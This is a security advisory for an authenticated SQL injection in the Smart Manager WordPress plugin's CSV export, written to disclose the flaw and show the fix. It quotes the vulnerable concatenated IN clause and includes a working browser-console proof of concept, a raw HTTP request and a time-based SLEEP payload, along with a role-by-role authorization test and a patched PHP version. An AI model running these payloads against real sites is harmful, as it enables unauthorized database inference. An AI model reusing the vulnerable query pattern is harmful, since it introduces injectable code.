# Advisory — Smart Manager for WP e-Commerce 8.99.0 — SQL Injection in `selected_ids` During CSV Export

## Summary

Smart Manager for WP e-Commerce 8.99.0 concatenates user-controlled values into the `IN (...)` filter used during CSV export. The `selected_ids` parameter is received as JSON, decoded, and inserted into the SQL clause without numeric validation, an allowlist, or placeholders.

User-controlled SQL execution was confirmed with a time-based `SLEEP(3)` condition. In the laboratory, the normal export responded in approximately 0.35 seconds, while the same export with the payload responded in approximately 3.3 seconds.

The vulnerability requires an authenticated session with access to Smart Manager and a valid plugin nonce. Anonymous exploitation was not demonstrated.

## CVE Description

The Smart Manager for WP e-Commerce plugin for WordPress, versions 8.99.0 and 9.0.0, is vulnerable to authenticated SQL injection via the `selected_ids` parameter in the `sa_sm_manager_include_file` AJAX action when `cmd=get_export_csv`. The plugin decodes attacker-controlled JSON and concatenates its elements directly into an SQL `IN (...)` clause without adequate numeric validation or prepared statements. An authenticated user who can access Smart Manager and obtain a valid plugin nonce can inject arbitrary SQL expressions, as demonstrated by time-based blind SQL execution, potentially accessing database data subject to the WordPress database account privileges. Anonymous exploitation was not demonstrated.

## Affected Product

- Plugin: Smart Manager for WP e-Commerce
- Slug: `smart-manager-for-wp-e-commerce`
- Tested version: `8.99.0`
- Endpoint: `POST /wp-admin/admin-ajax.php`
- Action: `sa_sm_manager_include_file`
- Command: `get_export_csv`
- Tested dashboard module: `posts`
- Additional affected surface: order export (`wc_orders`)

## Classification

- Category: CWE-89 — Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
- Type: Authenticated SQL injection demonstrated through a time-based channel
- Suggested severity: High in the administrative context; the normal PoC requires an authenticated administrator in this Lite installation
- Confidentiality: Potential inferential access to data available to the database user
- Integrity/availability: The demonstrated PoC only evaluates an expression in a read query; it does not demonstrate writes, multiple statements, or RCE

## Vulnerable Flow

1. The dashboard sends an AJAX request to `sa_sm_manager_include_file`.
2. `SA_Manager_Controller::request_handler()` validates the `sa-sm-manager-security` nonce and uses `cmd` to dynamically dispatch the requested method.
3. The `get_export_csv` command calls `Smart_Manager_Base::get_data_model()`.
4. `get_where_clause_for_search()` decodes `selected_ids` and concatenates the result directly into SQL.

Relevant files and lines:

- `common-core/classes/class-sa-manager-controller.php:138-159` — request and nonce validation.
- `common-core/classes/class-sa-manager-controller.php:246-258` — dynamic command dispatch.
- `classes/class-smart-manager-base.php:71` — the child constructor replaces sanitized parameters with raw `$_REQUEST` data.
- `classes/class-smart-manager-base.php:3331-3439` — `get_export_csv()` implementation.
- `classes/class-smart-manager-base.php:3554-3613` — `WHERE` clause construction.
- `classes/class-smart-manager-shop-order.php:1615-1617` — equivalent occurrence for orders.

Vulnerable code in `classes/class-smart-manager-base.php`:

```php
if ( ! empty( $this->req_params['selected_ids'] )
    && ( '[]' !== $this->req_params['selected_ids'] )
    && empty( $this->req_params['storewide_option'] )
    && ( 'get_export_csv' === $this->req_params['cmd'] ) ) {
    $selected_ids = json_decode( stripslashes( $this->req_params['selected_ids'] ) );
    $params['where'] .= ( ! empty( $selected_ids ) )
        ? " AND {$wpdb->prefix}posts.ID IN (" . implode( ",", $selected_ids ) . ")"
        : $params['where'];
}
```

The same pattern is used for orders:

```php
$selected_ids = json_decode( stripslashes( $curr_obj->req_params['selected_ids'] ) );
$clauses['where'] .= " AND {$wpdb->prefix}wc_orders.id IN ("
    . implode( ",", $selected_ids ) . ")";
```

The values are not converted with `absint()`, checked to ensure that every element is an integer, or inserted through placeholders.

## Test Preconditions

- An authenticated WordPress administrator account.
- Access to the main Smart Manager dashboard:

```text
http://172.25.44.135:8081/wp-admin/admin.php?page=smart-manager
```

Do not use the page with `&landing-page=sm-about`; that page is Docs & Support and does not load `window.smart_manager.saCommonNonce`.

- The plugin must be active.
- The request must use the same host as the authenticated session. Cookies obtained from `127.0.0.1` are not sent to `172.25.44.135`.

## Optional Plugin Table Preparation

The normal export may work without special data, but the temporary search table should exist for a complete reproduction of the plugin flow. The official method is idempotent:

```bash
docker exec -i wordpress-audit-lab-wordpress-1 php <<'PHP'
<?php
require '/var/www/html/wp-load.php';
require_once '/var/www/html/wp-content/plugins/smart-manager-for-wp-e-commerce/classes/class-smart-manager-install.php';

Smart_Manager_Install::create_tables();

global $wpdb;
$table = $wpdb->prefix . 'sm_advanced_search_temp';
echo 'table=' . $table . PHP_EOL;
echo 'exists=' . (($wpdb->get_var($wpdb->prepare('SHOW TABLES LIKE %s', $table)) === $table) ? 'yes' : 'no') . PHP_EOL;
PHP
```

This command does not insert test records; it only ensures that the tables used by the plugin exist.

## Reproducible Browser Console PoC

1. Log in as an administrator on host `172.25.44.135:8081`.
2. Open the main Smart Manager dashboard.
3. Open DevTools and select the Console tab.
4. Execute:

```javascript
(async () => {
  const nonce = window.smart_manager?.saCommonNonce;
  const ajaxUrl = window.ajaxurl;

  if (!nonce) {
    throw new Error(
      "Nonce unavailable. Open /wp-admin/admin.php?page=smart-manager without landing-page=sm-about."
    );
  }

  if (!ajaxUrl) {
    throw new Error("window.ajaxurl is not available on this administrative page");
  }

  async function probe(selectedIds) {
    const body = new URLSearchParams({
      action: "sa_sm_manager_include_file",
      active_module: "posts",
      cmd: "get_export_csv",
      security: nonce,
      sort_params: JSON.stringify({
        column: "posts/ID",
        sortOrder: "DESC"
      }),
      table_model: JSON.stringify({
        posts: {
          where: {
            post_type: ["post"],
            post_status: "any"
          }
        }
      }),
      columnsToBeExported: "visible",
      selected_ids: JSON.stringify(selectedIds)
    });

    const start = performance.now();

    const response = await fetch(ajaxUrl, {
      method: "POST",
      credentials: "include",
      body
    });

    const text = await response.text();

    return {
      selected_ids: selectedIds,
      status: response.status,
      elapsed_ms: Math.round(performance.now() - start),
      body_prefix: text.slice(0, 100)
    };
  }

  console.table({
    baseline: await probe(["1"]),
    sqli_sleep: await probe([
      "1) AND (SELECT SLEEP(3))=0 #"
    ])
  });
})();
```

### Expected Result

The first request uses a normal ID. The second injects an expression inside `posts.ID IN (...)`.

Example observed in the laboratory:

```text
baseline  : HTTP 200, approximately 350 ms
sqli_sleep: HTTP 200, approximately 3300 ms
```

The response body is the export CSV. The timing difference confirms that the SQL expression was executed by MariaDB.

For repeated tests, use `SLEEP(2)` or `SLEEP(3)`. Do not repeatedly use `SLEEP(15)`, because the query may evaluate the expression more than once depending on the number of records.

## Equivalent Request

The logical request sent by the browser is:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 172.25.44.135:8081
Cookie: wordpress_logged_in_<hash>=<cookie>
Content-Type: application/x-www-form-urlencoded

action=sa_sm_manager_include_file&
active_module=posts&
cmd=get_export_csv&
security=<sa-sm-manager-security>&
sort_params={"column":"posts/ID","sortOrder":"DESC"}&
table_model={"posts":{"where":{"post_type":["post"],"post_status":"any"}}}&
columnsToBeExported=visible&
selected_ids=["1) AND (SELECT SLEEP(3))=0 #"]
```

The value reaches the query as:

```sql
... AND wp_posts.ID IN (1) AND (SELECT SLEEP(3))=0 #)
```

The `#)` sequence comments out the remaining closing parenthesis generated by the plugin.

## Additional Code Evidence

The exporter copies request parameters into the object before querying data:

```php
$this->req_params = $params;
$data = $this->get_data_model( $col_model );
```

The `selected_ids` filter is applied when `cmd` is `get_export_csv`, so the user-controlled value enters the normal export path. No `wpdb->prepare()` call surrounds the concatenated list.

## Authentication and Authorization Scope

- No `register_rest_route()` call was found in the plugin.
- No `wp_ajax_nopriv_*` hook was found.
- The PoC uses `wp-admin/admin-ajax.php` and requires the `sa-sm-manager-security` nonce.
- In the Lite interface, the Smart Manager menu is shown to administrators; the confirmed browser test used an administrator session.
- The controller validates login, administrative context, and the nonce, but the handler does not impose an explicit capability check before dynamically dispatching the command. Effective authorization therefore depends on dashboard access and nonce availability.

## User-Level Testing

An isolated controller test was run with `WP_ADMIN` and `DOING_AJAX` defined, a nonce generated for each user, and an unknown command. A callback marker confirmed whether each request passed the access control before dispatch:

| Role | `manage_options` | `manage_woocommerce` | Passed controller |
|---|---:|---:|---:|
| Administrator | yes | yes | yes |
| Subscriber | no | no | yes |
| Contributor | no | no | yes |
| Author | no | no | yes |
| Editor | no | no | yes |
| Customer | no | no | yes |
| Shop manager | no | yes | yes |

The existing Subscriber (ID 9) also executed the valid `get_dashboard_model` command and received the dashboard JSON model. In the same isolated context, it executed `get_export_csv` with `selected_ids=["1) AND (SELECT SLEEP(1))=0 #"]` and received the CSV after the expected time delay.

### Interpretation

- In the normal Lite interface, the menu and `saCommonNonce` are presented on the main Smart Manager page for administrators; therefore, the browser PoC is documented as requiring administrator access.
- At the endpoint level, a nonce does not replace authorization. A lower-privileged account that obtains a valid nonce can pass the controller because `check_dashboard_access()` grants access to non-administrator roles in the Lite version and the handler has no `current_user_can()` check.
- The test does not demonstrate how a Subscriber would obtain this nonce through a normal flow, because the main page is not exposed in the Lite menu for that role. The missing capability check remains a defense-in-depth authorization flaw.

The temporary Contributor, Author, Editor, Customer, and Shop Manager accounts used for testing were removed afterward. The existing Subscriber account was not modified.

## Multisite Validation Status

Exploitability in a WordPress Multisite environment was not confirmed. The validation described in this advisory was performed on a single-site installation. Do not claim multisite exploitability unless the same PoC has been reproduced with a site-level account in a real Multisite laboratory.

## Impact

A user who can access the dashboard and obtain the nonce can modify the SQL expression in the export `WHERE` clause. The demonstrated impact is time-based blind execution, which can be used to infer database values through conditional SQL expressions.

This validation did not demonstrate:

- execution of multiple SQL statements;
- writing or deleting database records;
- PHP code execution;
- arbitrary file upload;
- anonymous access;
- direct operating-system file reads.

## Recommended Fix

Validate `selected_ids` as a list of positive integers and generate placeholders for each element:

```php
$raw_selected_ids = $this->req_params['selected_ids'] ?? array();

if (!is_array($raw_selected_ids)) {
    $raw_selected_ids = json_decode(
        stripslashes((string) $raw_selected_ids),
        true
    );
}

$selected_ids = is_array($raw_selected_ids)
    ? array_values(array_filter(array_map('absint', $raw_selected_ids)))
    : array();

if (!empty($selected_ids)) {
    $placeholders = implode(',', array_fill(0, count($selected_ids), '%d'));
    $params['where'] .= $wpdb->prepare(
        " AND {$wpdb->prefix}posts.ID IN ($placeholders)",
        $selected_ids
    );
}
```

Apply the same fix to the order flow in `class-smart-manager-shop-order.php`. Also add a capability check consistent with dashboard access before executing export commands, and restrict dispatcher methods to an explicit allowlist.

## Laboratory State

- The plugin was activated for validation.
- The `wp_sm_advanced_search_temp` table was created through the plugin's official method.
- The PoC did not create permanent records or files.
- The export did not modify site content.
